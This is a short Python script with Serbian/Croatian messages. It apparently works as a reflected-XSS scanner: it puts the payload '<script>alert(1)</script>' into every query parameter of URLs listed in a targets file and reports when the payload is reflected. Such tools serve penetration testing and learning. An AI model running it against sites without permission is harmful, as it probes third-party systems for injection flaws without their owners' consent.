import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

XSS_PAYLOAD = "<script>alert(1)</script>"
def load_targets(file_path="targets.txt"):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def inject_payload(url, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    injected_qs = {k: payload for k in qs}
    new_query = urlencode(injected_qs, doseq=True)
    injected_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
    return injected_url

def check_reflection(response_text, payload):
    return payload in response_text

def run_xss_scan():
    targets = load_targets()
    for url in targets:
        injected_url = inject_payload(url, XSS_PAYLOAD)
        print(f"[+] Testiram: {injected_url}")
        try:
            res = requests.get(injected_url)
            if check_reflection(res.text, XSS_PAYLOAD):
                print("[!!] Reflektovani XSS MOGUĆ!")
            else:
                print("[-] Nema refleksije.")
        except Exception as e:
            print(f"[X] Greška: {e}")
if __name__ == "__main__":
    run_xss_scan()
